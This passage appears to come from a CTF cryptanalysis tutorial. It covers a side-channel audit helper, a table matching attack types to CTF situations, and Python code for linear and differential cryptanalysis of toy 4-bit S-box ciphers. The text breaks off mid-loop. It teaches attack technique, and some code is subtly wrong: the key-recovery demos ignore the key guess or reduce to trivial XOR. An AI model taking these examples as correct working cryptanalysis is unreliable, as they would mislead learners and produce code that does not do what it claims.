    if implementation_details.get('distinct_error_messages'):
        issues.append("MEDIUM: Error messages leak information")
        recommendations.append("Return generic error messages")
    
    # Fault resistance
    if not implementation_details.get('fault_detection'):
        issues.append("LOW: No fault detection in cryptographic operations")
        recommendations.append("Verify results or use redundant computation")
    
    # Cache resistance
    if implementation_details.get('lookup_table_crypto'):
        issues.append("MEDIUM: Cache-timing vulnerable lookup tables")
        recommendations.append("Use cache-oblivious algorithms or hardware instructions")
    
    report = {
        'issues': issues,
        'recommendations': recommendations,
        'risk_level': 'CRITICAL' if any('CRITICAL' in i for i in issues) else
                      'HIGH' if any('HIGH' in i for i in issues) else
                      'MEDIUM' if any('MEDIUM' in i for i in issues) else
                      'LOW'
    }
    
    return report

# Example audit
implementation = {
    'constant_time_comparison': False,
    'constant_time_crypto': True,
    'secure_memory_clearing': False,
    'distinct_error_messages': True,
    'lookup_table_crypto': False
}

audit = side_channel_defense_audit(implementation)
print(f"Risk Level: {audit['risk_level']}\n")
print("Issues Found:")
for issue in audit['issues']:
    print(f"  - {issue}")
print("\nRecommendations:")
for rec in audit['recommendations']:
    print(f"  - {rec}")
```

---

**Key Takeaways for CTF:**

1. **Attack Classification Recognition:**
    
    - COA: Only ciphertext → frequency analysis, pattern detection
    - KPA: Known pairs → key recovery, codebook building
    - CPA: Chosen plaintext → ECB byte-at-a-time, padding oracle
    - CCA: Chosen ciphertext → RSA multiplicative, Bleichenbacher
    - Side-channel: Timing, power, cache → statistical analysis
2. **CTF Quick Decision Matrix:**
    
    - ECB detected → Chosen plaintext attack
    - Padding errors exposed → Padding oracle attack
    - Decryption oracle → Chosen ciphertext attack
    - Remote timing observable → Timing attack
    - RSA without OAEP → Multiplicative or Bleichenbacher
3. **Tool Selection:**
    
    - Timing attacks: Custom Python with `time.perf_counter()` and statistics
    - Padding oracle: PadBuster or custom implementation
    - Classical ciphers: Frequency analysis, IoC calculation
    - Modern ciphers: Oracle exploitation, bit flipping
4. **Always Consider:**
    
    - What does the attacker control? (plaintexts, ciphertexts, timing)
    - What does the oracle reveal? (errors, timing, validity)
    - What is the implementation weakness? (mode, comparison, oracle)

---

## Linear Cryptanalysis in CTF Exploitation

### Linear Cryptanalysis Fundamentals

**Concept Overview**

Linear cryptanalysis is a known-plaintext attack that exploits linear approximations of the nonlinear components in block ciphers. The attack finds linear expressions that approximate the cipher's behavior with probability different from 1/2.

**Basic Principle**

For a block cipher with plaintext bits P[i], ciphertext bits C[j], and key bits K[k]:

```
P[i₁] ⊕ P[i₂] ⊕ ... ⊕ C[j₁] ⊕ C[j₂] ⊕ ... = K[k₁] ⊕ K[k₂] ⊕ ...
```

This linear approximation holds with probability p ≠ 0.5, where |p - 0.5| is called the **bias** (ε).

### S-box Linear Approximations

**S-box Basics**

An S-box (Substitution box) is a nonlinear transformation that maps n input bits to m output bits. Linear approximations attempt to find linear relationships between input and output bits.

**Linear Approximation Table (LAT) Construction**

```python
def compute_lat(sbox):
    """
    Compute Linear Approximation Table for an S-box
    LAT[a][b] = #{x : x·a = S(x)·b} - 2^(n-1)
    where · represents dot product (parity of bitwise AND)
    """
    n = len(sbox).bit_length() - 1  # Input size
    m = max(sbox).bit_length()       # Output size
    size_in = 1 << n
    size_out = 1 << m
    
    lat = [[0 for _ in range(size_out)] for _ in range(size_in)]
    
    for input_mask in range(size_in):
        for output_mask in range(size_out):
            count = 0
            for x in range(size_in):
                # Compute parity of input_mask & x
                input_parity = bin(input_mask & x).count('1') % 2
                # Compute parity of output_mask & S(x)
                output_parity = bin(output_mask & sbox[x]).count('1') % 2
                
                if input_parity == output_parity:
                    count += 1
            
            # Store bias (count - 2^(n-1))
            lat[input_mask][output_mask] = count - (size_in // 2)
    
    return lat

# Example: 4-bit S-box from simplified DES
sbox_example = [
    0xE, 0x4, 0xD, 0x1, 0x2, 0xF, 0xB, 0x8,
    0x3, 0xA, 0x6, 0xC, 0x5, 0x9, 0x0, 0x7
]

lat = compute_lat(sbox_example)

# Display LAT
print("Linear Approximation Table:")
print("Input\\Output", end="")
for j in range(len(lat[0])):
    print(f"\t{j:X}", end="")
print()

for i in range(len(lat)):
    print(f"{i:X}", end="")
    for j in range(len(lat[i])):
        print(f"\t{lat[i][j]:+d}", end="")
    print()
```

**Finding Best Linear Approximations**

```python
def find_best_approximations(lat, top_n=10):
    """
    Find the best linear approximations (highest absolute bias)
    """
    approximations = []
    
    for input_mask in range(len(lat)):
        for output_mask in range(len(lat[0])):
            bias = lat[input_mask][output_mask]
            if bias != 0:  # Ignore trivial approximation
                approximations.append({
                    'input_mask': input_mask,
                    'output_mask': output_mask,
                    'bias': bias,
                    'probability': 0.5 + bias / (len(lat))
                })
    
    # Sort by absolute bias
    approximations.sort(key=lambda x: abs(x['bias']), reverse=True)
    
    return approximations[:top_n]

# Find best approximations
best_approx = find_best_approximations(lat, top_n=5)

print("\nBest Linear Approximations:")
for approx in best_approx:
    print(f"Input mask: 0x{approx['input_mask']:X}, "
          f"Output mask: 0x{approx['output_mask']:X}, "
          f"Bias: {approx['bias']}, "
          f"Probability: {approx['probability']:.4f}")
```

**Computing Probability from LAT Entry**

```python
def lat_to_probability(lat_entry, sbox_size):
    """
    Convert LAT entry to probability
    probability = 1/2 + (LAT_entry / sbox_size)
    """
    return 0.5 + (lat_entry / sbox_size)

def probability_to_bias(probability):
    """
    Convert probability to bias (epsilon)
    bias = |probability - 0.5|
    """
    return abs(probability - 0.5)

# Example calculation
sbox_size = 16  # 4-bit S-box
lat_entry = 6
prob = lat_to_probability(lat_entry, sbox_size)
bias = probability_to_bias(prob)

print(f"LAT entry: {lat_entry}")
print(f"Probability: {prob:.4f}")
print(f"Bias (ε): {bias:.4f}")
```

**S-box Linear Approximation Verification**

```python
def verify_linear_approximation(sbox, input_mask, output_mask):
    """
    Verify a linear approximation by testing all inputs
    """
    matches = 0
    total = len(sbox)
    
    for x in range(total):
        # Compute input parity
        input_bits = bin(x & input_mask).count('1') % 2
        # Compute output parity
        output_bits = bin(sbox[x] & output_mask).count('1') % 2
        
        if input_bits == output_bits:
            matches += 1
    
    probability = matches / total
    bias = abs(probability - 0.5)
    
    print(f"Input mask: 0x{input_mask:X}")
    print(f"Output mask: 0x{output_mask:X}")
    print(f"Matches: {matches}/{total}")
    print(f"Probability: {probability:.4f}")
    print(f"Bias: {bias:.4f}")
    
    return probability, bias

# Example verification
verify_linear_approximation(sbox_example, 0xB, 0x9)
```

### Piling-up Lemma

**Theoretical Foundation**

The Piling-up Lemma (Matsui, 1993) allows combining multiple independent linear approximations to compute the overall bias of a linear characteristic through multiple rounds.

**Mathematical Statement**

For n independent random binary variables X₁, X₂, ..., Xₙ with:

- Pr[Xᵢ = 0] = 1/2 + εᵢ (bias εᵢ)

The parity X₁ ⊕ X₂ ⊕ ... ⊕ Xₙ has:

- Pr[X₁ ⊕ X₂ ⊕ ... ⊕ Xₙ = 0] = 1/2 + 2ⁿ⁻¹ ∏ᵢ εᵢ

**Python Implementation**

```python
def piling_up_lemma(biases):
    """
    Apply Piling-up Lemma to combine multiple biases
    
    Args:
        biases: list of individual biases (ε values)
    
    Returns:
        combined bias
    """
    n = len(biases)
    
    # Combined bias = 2^(n-1) * product of all biases
    product = 1.0
    for bias in biases:
        product *= bias
    
    combined_bias = (2 ** (n - 1)) * product
    
    return combined_bias

# Example: Combining 3 approximations
bias1 = 0.125  # ε₁ = 1/8
bias2 = 0.0625  # ε₂ = 1/16
bias3 = 0.25   # ε₃ = 1/4

combined = piling_up_lemma([bias1, bias2, bias3])
combined_prob = 0.5 + combined

print(f"Individual biases: {bias1}, {bias2}, {bias3}")
print(f"Combined bias: {combined:.6f}")
print(f"Combined probability: {combined_prob:.6f}")
```

**Piling-up for Multiple Rounds**

```python
def multi_round_bias(round_biases):
    """
    Calculate overall bias through multiple cipher rounds
    using Piling-up Lemma
    
    [Inference: Assumes independence of round approximations]
    """
    return piling_up_lemma(round_biases)

def required_plaintexts(bias):
    """
    Estimate number of plaintext-ciphertext pairs needed
    for linear cryptanalysis with given bias
    
    [Inference: Based on standard formula N ≈ 1/ε²]
    """
    if bias == 0:
        return float('inf')
    
    # Approximate formula: N ≈ c/ε² where c is a small constant (typically 1-4)
    c = 1  # Conservative estimate
    return int(c / (bias ** 2))

# Example: 3-round cipher
round1_bias = 0.125
round2_bias = 0.0625
round3_bias = 0.0625

overall_bias = multi_round_bias([round1_bias, round2_bias, round3_bias])
num_pairs = required_plaintexts(overall_bias)

print(f"Overall bias: {overall_bias:.8f}")
print(f"Required plaintext pairs: {num_pairs:,}")
print(f"Probability: {0.5 + overall_bias:.8f}")
```

**Piling-up with Signed Biases**

```python
def signed_piling_up(biases_with_signs):
    """
    Piling-up lemma considering sign of biases
    
    Args:
        biases_with_signs: list of tuples (bias, sign)
                          where sign is +1 or -1
    """
    n = len(biases_with_signs)
    
    # Calculate product of absolute biases
    product = 1.0
    for bias, _ in biases_with_signs:
        product *= abs(bias)
    
    # Calculate overall sign
    overall_sign = 1
    for _, sign in biases_with_signs:
        overall_sign *= sign
    
    combined_bias = overall_sign * (2 ** (n - 1)) * product
    
    return combined_bias

# Example with mixed signs
biases_signed = [
    (0.125, +1),   # Positive correlation
    (0.0625, -1),  # Negative correlation
    (0.25, +1)     # Positive correlation
]

combined_signed = signed_piling_up(biases_signed)
print(f"Combined bias (with signs): {combined_signed:.6f}")
```

**Verification by Simulation**

```python
import random

def simulate_piling_up(biases, num_trials=100000):
    """
    Verify Piling-up Lemma through simulation
    """
    matches = 0
    
    for _ in range(num_trials):
        # Generate random bits with given biases
        result = 0
        for bias in biases:
            prob = 0.5 + bias
            bit = 1 if random.random() < prob else 0
            result ^= bit
        
        if result == 0:
            matches += 1
    
    simulated_prob = matches / num_trials
    simulated_bias = simulated_prob - 0.5
    
    # Calculate theoretical bias
    theoretical_bias = piling_up_lemma(biases)
    theoretical_prob = 0.5 + theoretical_bias
    
    print(f"Theoretical probability: {theoretical_prob:.6f}")
    print(f"Simulated probability: {simulated_prob:.6f}")
    print(f"Theoretical bias: {theoretical_bias:.6f}")
    print(f"Simulated bias: {simulated_bias:.6f}")
    print(f"Difference: {abs(theoretical_bias - simulated_bias):.6f}")
    
    return simulated_bias

# Test with example biases
test_biases = [0.125, 0.0625, 0.25]
simulate_piling_up(test_biases)
```

### Linear Characteristic Construction

**Single Round Linear Approximation**

```python
def single_round_linear_approx(sbox_lat, input_mask, output_mask):
    """
    Find linear approximation for a single round using S-box LAT
    """
    bias = sbox_lat[input_mask][output_mask]
    sbox_size = len(sbox_lat)
    probability = 0.5 + (bias / sbox_size)
    
    return {
        'input_mask': input_mask,
        'output_mask': output_mask,
        'bias': bias / sbox_size,
        'probability': probability
    }
```

**Multi-Round Linear Trail**

```python
def build_linear_trail(sbox_lats, round_masks):
    """
    Build a linear trail through multiple rounds
    
    Args:
        sbox_lats: list of LAT for each round (or same LAT if identical)
        round_masks: list of (input_mask, output_mask) tuples for each round
    
    [Inference: Trail construction based on standard linear cryptanalysis methodology]
    """
    trail = []
    round_biases = []
    
    for round_num, (lat, masks) in enumerate(zip(sbox_lats, round_masks)):
        input_mask, output_mask = masks
        
        # Get bias from LAT
        lat_entry = lat[input_mask][output_mask]
        sbox_size = len(lat)
        bias = lat_entry / sbox_size
        
        round_biases.append(bias)
        
        trail.append({
            'round': round_num,
            'input_mask': input_mask,
            'output_mask': output_mask,
            'bias': bias,
            'probability': 0.5 + bias
        })
    
    # Calculate overall characteristics using Piling-up
    overall_bias = piling_up_lemma(round_biases)
    
    return {
        'trail': trail,
        'round_biases': round_biases,
        'overall_bias': overall_bias,
        'overall_probability': 0.5 + overall_bias
    }

# Example usage
# [Unverified: Example parameters, adjust based on actual cipher]
num_rounds = 3
sbox_lats = [lat] * num_rounds  # Use same LAT for all rounds
round_masks = [
    (0xB, 0x9),
    (0x9, 0x6),
    (0x6, 0xF)
]

linear_trail = build_linear_trail(sbox_lats, round_masks)

print("Linear Trail:")
for round_info in linear_trail['trail']:
    print(f"Round {round_info['round']}: "
          f"Input mask: 0x{round_info['input_mask']:X}, "
          f"Output mask: 0x{round_info['output_mask']:X}, "
          f"Bias: {round_info['bias']:.6f}")

print(f"\nOverall bias: {linear_trail['overall_bias']:.8f}")
print(f"Overall probability: {linear_trail['overall_probability']:.8f}")
```

### Practical Linear Attack Implementation

**Key Bit Extraction**

```python
def linear_attack_key_recovery(plaintexts, ciphertexts, input_mask, output_mask, key_guess_bits):
    """
    Recover key bits using linear cryptanalysis
    
    Args:
        plaintexts: list of known plaintexts
        ciphertexts: corresponding ciphertexts
        input_mask: input bit mask for linear approximation
        output_mask: output bit mask for linear approximation
        key_guess_bits: number of key bits to guess
    
    [Inference: Implements Algorithm 2 from Matsui's original paper]
    """
    num_pairs = len(plaintexts)
    best_key_guess = None
    max_bias = 0
    
    # Try all possible key guesses
    for key_guess in range(1 << key_guess_bits):
        count = 0
        
        for pt, ct in zip(plaintexts, ciphertexts):
            # Compute input parity
            input_parity = bin(pt & input_mask).count('1') % 2
            
            # Partial decryption with key guess
            partial_ct = ct ^ key_guess  # Simplified for demonstration
            
            # Compute output parity
            output_parity = bin(partial_ct & output_mask).count('1') % 2
            
            # Check if approximation holds
            if input_parity == output_parity:
                count += 1
        
        # Calculate bias for this key guess
        probability = count / num_pairs
        bias = abs(probability - 0.5)
        
        if bias > max_bias:
            max_bias = bias
            best_key_guess = key_guess
    
    return {
        'key_guess': best_key_guess,
        'bias': max_bias,
        'probability': 0.5 + max_bias
    }

# Example usage
# [Unverified: Synthetic example data]
import random

def generate_test_data(correct_key, num_pairs, true_bias):
    """Generate synthetic test data for linear attack"""
    plaintexts = []
    ciphertexts = []
    
    for _ in range(num_pairs):
        pt = random.randint(0, 0xFFFF)
        # Simplified encryption: CT = PT XOR KEY
        ct = pt ^ correct_key
        plaintexts.append(pt)
        ciphertexts.append(ct)
    
    return plaintexts, ciphertexts

# Test linear attack
correct_key = 0xAB
num_pairs = 10000
pts, cts = generate_test_data(correct_key, num_pairs, 0.125)

result = linear_attack_key_recovery(pts, cts, 0xFF, 0xFF, 8)
print(f"Recovered key guess: 0x{result['key_guess']:X}")
print(f"Correct key: 0x{correct_key:X}")
print(f"Match: {result['key_guess'] == correct_key}")
print(f"Observed bias: {result['bias']:.6f}")
```

**Success Rate Estimation**

```python
def estimate_success_probability(bias, num_samples, confidence_level=0.95):
    """
    Estimate probability of successful key recovery
    
    [Inference: Based on statistical hypothesis testing theory]
    """
    import math
    
    # Standard normal quantile for confidence level
    if confidence_level == 0.95:
        z_alpha = 1.96
    elif confidence_level == 0.99:
        z_alpha = 2.576
    else:
        # Approximate for other confidence levels
        from scipy import stats
        z_alpha = stats.norm.ppf(1 - (1 - confidence_level) / 2)
    
    # Expected deviation
    expected_std = math.sqrt(num_samples) * 2 * bias
    
    # Success probability (simplified model)
    success_prob = 1 - math.exp(-expected_std / z_alpha) if expected_std > 0 else 0
    
    print(f"Bias: {bias:.6f}")
    print(f"Number of samples: {num_samples:,}")
    print(f"Expected standard deviations from random: {expected_std:.2f}")
    print(f"Estimated success probability: {success_prob:.4f}")
    
    return success_prob

# Example estimation
estimate_success_probability(0.01, 10000)
estimate_success_probability(0.01, 50000)
```

### CTF Challenge Example

**Simplified Block Cipher with Linear Weakness**

```python
class SimpleCipher:
    """
    Simplified block cipher for demonstrating linear cryptanalysis
    [Unverified: Educational example, not a real cipher]
    """
    
    def __init__(self, key):
        self.key = key
        self.sbox = [
            0xE, 0x4, 0xD, 0x1, 0x2, 0xF, 0xB, 0x8,
            0x3, 0xA, 0x6, 0xC, 0x5, 0x9, 0x0, 0x7
        ]
    
    def sbox_layer(self, value):
        """Apply S-box to nibbles"""
        result = 0
        for i in range(4):  # 4 nibbles in 16-bit block
            nibble = (value >> (i * 4)) & 0xF
            result |= self.sbox[nibble] << (i * 4)
        return result
    
    def encrypt(self, plaintext):
        """Simple encryption: XOR key, S-box, XOR key"""
        state = plaintext ^ self.key
        state = self.sbox_layer(state)
        state = state ^ self.key
        return state
    
    def decrypt(self, ciphertext):
        """Reverse encryption"""
        state = ciphertext ^ self.key
        # Invert S-box
        inv_sbox = [0] * 16
        for i, v in enumerate(self.sbox):
            inv_sbox[v] = i
        
        result = 0
        for i in range(4):
            nibble = (state >> (i * 4)) & 0xF
            result |= inv_sbox[nibble] << (i * 4)
        result = result ^ self.key
        return result

# Attack implementation
def attack_simple_cipher(known_pairs, input_mask, output_mask):
    """
    Perform linear attack on SimpleCipher
    """
    best_key = None
    max_bias = 0
    
    for key_guess in range(0x10000):
        cipher = SimpleCipher(key_guess)
        count = 0
        
        for pt, ct in known_pairs:
            # Check linear approximation
            pt_parity = bin(pt & input_mask).count('1') % 2
            ct_parity = bin(ct & output_mask).count('1') % 2
            
            if pt_parity == ct_parity:
                count += 1
        
        prob = count / len(known_pairs)
        bias = abs(prob - 0.5)
        
        if bias > max_bias:
            max_bias = bias
            best_key = key_guess
    
    return best_key, max_bias

# Generate test data
true_key = 0x1234
cipher = SimpleCipher(true_key)
num_pairs = 1000

known_pairs = []
for _ in range(num_pairs):
    pt = random.randint(0, 0xFFFF)
    ct = cipher.encrypt(pt)
    known_pairs.append((pt, ct))

# Perform attack
recovered_key, observed_bias = attack_simple_cipher(
    known_pairs, 
    0xFFFF,  # input mask
    0xFFFF   # output mask
)

print(f"True key: 0x{true_key:04X}")
print(f"Recovered key: 0x{recovered_key:04X}")
print(f"Observed bias: {observed_bias:.6f}")
print(f"Attack successful: {recovered_key == true_key}")
```

---

**Important Related Topics:**

- Differential cryptanalysis and its relationship to linear cryptanalysis
- Impossible differential and zero-correlation linear cryptanalysis
- Multiple linear approximations and linear hull effect
- Linear cryptanalysis of specific ciphers (DES, AES reduced rounds, lightweight ciphers)
- Integral cryptanalysis and higher-order differential cryptanalysis
- Automated search algorithms for finding optimal linear characteristics

---

## Differential Cryptanalysis

### Overview and Cryptanalytic Context

Differential cryptanalysis is a chosen-plaintext attack that analyzes how differences in input pairs propagate through a cipher's transformations to produce differences in output pairs. Introduced by Eli Biham and Adi Shamir in 1990 against DES, this technique exploits non-random behavior in cipher components, particularly S-boxes and round functions.

**Core principle**: Certain input differences are more likely than others to produce specific output differences, revealing information about the key.

**CTF relevance**: While rarely used against modern ciphers (AES resists differential attacks), CTF challenges often feature:

- Reduced-round versions of standard ciphers
- Custom S-box implementations with weak differential properties
- Educational implementations of DES, FEAL, or simplified ciphers
- Block cipher modes vulnerable to differential techniques

**Attack prerequisites:**

- Ability to encrypt chosen plaintext pairs
- Knowledge of cipher structure (S-boxes, permutations, round function)
- Large number of plaintext-ciphertext pairs (thousands to millions)

### Difference Propagation

Difference propagation tracks how input differences (XOR of plaintext pairs) transform through cipher rounds to produce output differences.

**Fundamental concepts:**

**Difference notation:**

```
Δ = XOR difference
ΔP = P₁ ⊕ P₂  (plaintext difference)
ΔC = C₁ ⊕ C₂  (ciphertext difference)

For intermediate rounds:
ΔX = X₁ ⊕ X₂  (state difference after operation X)
```

**Basic difference propagation example:**

```python
#!/usr/bin/env python3

def xor_difference(a, b):
    """Calculate XOR difference between two values"""
    return a ^ b

def demonstrate_difference_propagation():
    """
    Simple example of difference propagation through XOR operation
    XOR with key preserves differences: (A ⊕ K) ⊕ (B ⊕ K) = A ⊕ B
    """
    P1 = 0b10110011
    P2 = 0b10010011
    key = 0b11001100
    
    # Input difference
    delta_P = xor_difference(P1, P2)
    print(f"Plaintext 1:     {P1:08b} ({P1})")
    print(f"Plaintext 2:     {P2:08b} ({P2})")
    print(f"Input Δ:         {delta_P:08b} ({delta_P})")
    
    # Apply key (XOR operation)
    C1 = P1 ^ key
    C2 = P2 ^ key
    
    print(f"\nAfter key XOR:")
    print(f"Ciphertext 1:    {C1:08b} ({C1})")
    print(f"Ciphertext 2:    {C2:08b} ({C2})")
    
    # Output difference
    delta_C = xor_difference(C1, C2)
    print(f"Output Δ:        {delta_C:08b} ({delta_C})")
    
    # Key property: difference unchanged through XOR
    print(f"\nΔP == ΔC: {delta_P == delta_C}")
    print("XOR with key preserves differences!")

demonstrate_difference_propagation()
```

**S-box difference propagation:**

```python
#!/usr/bin/env python3

def analyze_sbox_differences(sbox):
    """
    Analyze how differences propagate through an S-box
    Creates difference distribution table (DDT)
    """
    n = len(sbox)
    
    # Initialize DDT: ddt[input_diff][output_diff] = count
    ddt = [[0 for _ in range(n)] for _ in range(n)]
    
    # For each possible input pair
    for x1 in range(n):
        for x2 in range(n):
            input_diff = x1 ^ x2
            output_diff = sbox[x1] ^ sbox[x2]
            ddt[input_diff][output_diff] += 1
    
    return ddt

def print_ddt(ddt, max_size=16):
    """Print difference distribution table"""
    size = min(len(ddt), max_size)
    
    print("Difference Distribution Table (DDT)")
    print("Rows: Input Δ, Columns: Output Δ")
    print("=" * (size * 4 + 10))
    
    # Header
    print("   Δout→", end="")
    for j in range(size):
        print(f"{j:3x}", end="")
    print()
    print("Δin↓" + "-" * (size * 3 + 5))
    
    # Table
    for i in range(size):
        print(f"{i:3x}    ", end="")
        for j in range(size):
            if ddt[i][j] > 0:
                print(f"{ddt[i][j]:3d}", end="")
            else:
                print("  .", end="")
        print()

# Example: Simple 4-bit S-box
simple_sbox = [0xE, 0x4, 0xD, 0x1, 0x2, 0xF, 0xB, 0x8,
               0x3, 0xA, 0x6, 0xC, 0x5, 0x9, 0x0, 0x7]

print("4-bit S-box:", [hex(x)[2:] for x in simple_sbox])
print()

ddt = analyze_sbox_differences(simple_sbox)
print_ddt(ddt)
```

**Identifying high-probability differentials:**

```python
#!/usr/bin/env python3

def find_best_differentials(ddt, top_n=10):
    """
    Find input/output difference pairs with highest probability
    [Inference] High probability differentials indicate weak S-box design
    """
    n = len(ddt)
    differentials = []
    
    for input_diff in range(n):
        for output_diff in range(n):
            count = ddt[input_diff][output_diff]
            if input_diff != 0 and count > 0:  # Ignore zero difference
                probability = count / n
                differentials.append({
                    'input_diff': input_diff,
                    'output_diff': output_diff,
                    'count': count,
                    'probability': probability
                })
    
    # Sort by probability (descending)
    differentials.sort(key=lambda x: x['probability'], reverse=True)
    
    return differentials[:top_n]

# Find best differentials for the S-box
best_diffs = find_best_differentials(ddt)

print("\nTop differentials (excluding zero):")
print("=" * 60)
print(f"{'Input Δ':>10} {'Output Δ':>10} {'Count':>8} {'Probability':>12}")
print("-" * 60)

for diff in best_diffs:
    print(f"{diff['input_diff']:>10x} {diff['output_diff']:>10x} "
          f"{diff['count']:>8} {diff['probability']:>12.4f}")
```

**Multi-round difference propagation:**

```python
#!/usr/bin/env python3

def propagate_difference_through_round(input_diff, sbox, permutation=None):
    """
    Simulate difference propagation through one cipher round
    
    Round structure: XOR key → S-box → Permutation
    [Unverified] Simplified model for educational purposes
    """
    # 1. XOR with key preserves difference
    after_key = input_diff  # Unchanged
    
    # 2. S-box transformation (non-linear, changes difference)
    # Split into nibbles for S-box application
    nibbles = []
    temp = after_key
    sbox_size = len(sbox)
    bits_per_sbox = (sbox_size - 1).bit_length()
    mask = (1 << bits_per_sbox) - 1
    
    while temp > 0:
        nibbles.append(temp & mask)
        temp >>= bits_per_sbox
    
    # Apply S-box to each nibble (simplified)
    # [Inference] Actual propagation depends on specific input values
    # We show probabilistic behavior
    output_diffs = []
    for nibble_diff in nibbles:
        # In real attack, we'd use DDT to find likely output differences
        # For demo, just apply S-box directly (not realistic)
        if nibble_diff < len(sbox):
            output_diffs.append(sbox[nibble_diff])
        else:
            output_diffs.append(nibble_diff)
    
    # Reconstruct after S-box
    after_sbox = 0
    for i, diff in enumerate(output_diffs):
        after_sbox |= (diff << (i * bits_per_sbox))
    
    # 3. Permutation (linear, predictable)
    if permutation:
        after_perm = apply_permutation(after_sbox, permutation)
    else:
        after_perm = after_sbox
    
    return {
        'after_key': after_key,
        'after_sbox': after_sbox,
        'after_perm': after_perm
    }

def apply_permutation(value, perm_table):
    """Apply bit permutation"""
    result = 0
    for i, pos in enumerate(perm_table):
        if value & (1 << pos):
            result |= (1 << i)
    return result

# Example: Track difference through 2 rounds
input_difference = 0x0001  # Single bit difference

print("Difference Propagation Through Rounds:")
print("=" * 60)
print(f"Initial Δ: {input_difference:04x}")

current_diff = input_difference
for round_num in range(3):
    result = propagate_difference_through_round(current_diff, simple_sbox)
    print(f"\nRound {round_num + 1}:")
    print(f"  After key XOR: {result['after_key']:04x}")
    print(f"  After S-box:   {result['after_sbox']:04x}")
    print(f"  After perm:    {result['after_perm']:04x}")
    current_diff = result['after_perm']
```

**Calculating differential probability:**

```python
#!/usr/bin/env python3

def calculate_differential_probability(input_diff, output_diff, sbox):
    """
    Calculate probability that input_diff produces output_diff through S-box
    
    Probability = (# of input pairs producing this output diff) / (# total pairs)
    """
    n = len(sbox)
    count = 0
    
    # Test all possible input pairs with given difference
    for x in range(n):
        x_prime = x ^ input_diff
        if x_prime < n:
            actual_output_diff = sbox[x] ^ sbox[x_prime]
            if actual_output_diff == output_diff:
                count += 1
    
    probability = count / n
    return probability, count

# Example: Calculate specific differential probability
in_diff = 0x1
out_diff = 0x5

prob, count = calculate_differential_probability(in_diff, out_diff, simple_sbox)
print(f"Differential (0x{in_diff:x} → 0x{out_diff:x}):")
print(f"  Count: {count}/{len(simple_sbox)}")
print(f"  Probability: {prob:.4f} ({prob * 100:.2f}%)")

# Compare to random expectation
random_prob = 1 / len(simple_sbox)
print(f"  Random expectation: {random_prob:.4f} ({random_prob * 100:.2f}%)")
print(f"  Bias factor: {prob / random_prob:.2f}x")
```

### Characteristic Analysis

A differential characteristic is a sequence of differences through multiple cipher rounds with associated probabilities. Characteristic analysis identifies high-probability paths to exploit.

**Differential characteristic structure:**

```
Round 0: ΔP₀ → (operations) → ΔP₁ [probability p₁]
Round 1: ΔP₁ → (operations) → ΔP₂ [probability p₂]
Round 2: ΔP₂ → (operations) → ΔP₃ [probability p₃]
...
Total probability: p₁ × p₂ × p₃ × ...
```

**Building differential characteristics:**

```python
#!/usr/bin/env python3

class DifferentialCharacteristic:
    """Represents a multi-round differential characteristic"""
    
    def __init__(self):
        self.rounds = []
        self.total_probability = 1.0
    
    def add_round(self, input_diff, output_diff, probability):
        """Add a round to the characteristic"""
        self.rounds.append({
            'input_diff': input_diff,
            'output_diff': output_diff,
            'probability': probability
        })
        self.total_probability *= probability
    
    def get_input_output(self):
        """Get overall input and output differences"""
        if not self.rounds:
            return None, None
        return self.rounds[0]['input_diff'], self.rounds[-1]['output_diff']
    
    def __str__(self):
        result = "Differential Characteristic:\n"
        result += "=" * 60 + "\n"
        
        for i, round_data in enumerate(self.rounds):
            result += f"Round {i}: "
            result += f"Δ_in=0x{round_data['input_diff']:x} → "
            result += f"Δ_out=0x{round_data['output_diff']:x} "
            result += f"[p={round_data['probability']:.4f}]\n"
        
        result += "-" * 60 + "\n"
        result += f"Total probability: {self.total_probability:.6e}\n"
        result += f"Expected pairs needed: {1/self.total_probability:.0f}\n"
        
        return result

# Example: Build a 3-round characteristic
char = DifferentialCharacteristic()
char.add_round(input_diff=0x0001, output_diff=0x0040, probability=0.25)
char.add_round(input_diff=0x0040, output_diff=0x0100, probability=0.125)
char.add_round(input_diff=0x0100, output_diff=0x0008, probability=0.0625)

print(char)
```

**Searching for optimal characteristics:**

```python
#!/usr/bin/env python3
from collections import defaultdict
import heapq

def find_best_characteristics(sbox, num_rounds, top_n=5):
    """
    Find best differential characteristics through multiple rounds
    Uses breadth-first search with pruning
    
    [Inference] Exhaustive search only practical for small S-boxes and few rounds
    """
    # Build DDT once
    ddt = analyze_sbox_differences(sbox)
    n = len(sbox)
    
    # Priority queue: (negative probability, characteristic)
    # Use negative probability for max-heap behavior
    queue = []
    
    # Start with all non-zero input differences
    for input_diff in range(1, n):
        for output_diff in range(n):
            prob = ddt[input_diff][output_diff] / n
            if prob > 0:
                char = DifferentialCharacteristic()
                char.add_round(input_diff, output_diff, prob)
                heapq.heappush(queue, (-prob, char))
    
    # Extend characteristics round by round
    for round_num in range(1, num_rounds):
        next_queue = []
        
        # Process top candidates from previous round
        while queue and len(next_queue) < 1000:  # Limit search space
            neg_prob, char = heapq.heappop(queue)
            current_prob = -neg_prob
            
            # Get last output difference
            last_output = char.rounds[-1]['output_diff']
            
            # Try extending with next round
            for next_output in range(n):
                prob = ddt[last_output][next_output] / n
                if prob > 0:
                    # Create new characteristic
                    new_char = DifferentialCharacteristic()
                    for r in char.rounds:
                        new_char.add_round(r['input_diff'], r['output_diff'], r['probability'])
                    new_char.add_round(last_output, next_output, prob)
                    
                    heapq.heappush(next_queue, (-new_char.total_probability, new_char))
        
        queue = next_queue
    
    # Return top N characteristics
    results = []
    for _ in range(min(top_n, len(queue))):
        if queue:
            neg_prob, char = heapq.heappop(queue)
            results.append(char)
    
    return results

# Find best 2-round characteristics
print("Searching for best 2-round characteristics...")
best_chars = find_best_characteristics(simple_sbox, num_rounds=2, top_n=3)

for i, char in enumerate(best_chars, 1):
    print(f"\nCharacteristic #{i}:")
    print(char)
```

**Characteristic verification:**

```python
#!/usr/bin/env python3
import random

def verify_characteristic_experimentally(characteristic, sbox, num_trials=10000):
    """
    Verify characteristic probability through empirical testing
    [Unverified] Requires actual round function implementation
    """
    input_diff, expected_output_diff = characteristic.get_input_output()
    n = len(sbox)
    success_count = 0
    
    print(f"Testing characteristic: Δ_in=0x{input_diff:x} → Δ_out=0x{expected_output_diff:x}")
    print(f"Expected probability: {characteristic.total_probability:.6f}")
    print(f"Running {num_trials} trials...")
    
    for trial in range(num_trials):
        # Generate random plaintext pair with desired difference
        p1 = random.randint(0, n - 1)
        p2 = p1 ^ input_diff
        
        # Apply characteristic transformation (simplified single S-box)
        c1, c2 = p1, p2
        for round_data in characteristic.rounds:
            if c1 < len(sbox) and c2 < len(sbox):
                c1 = sbox[c1]
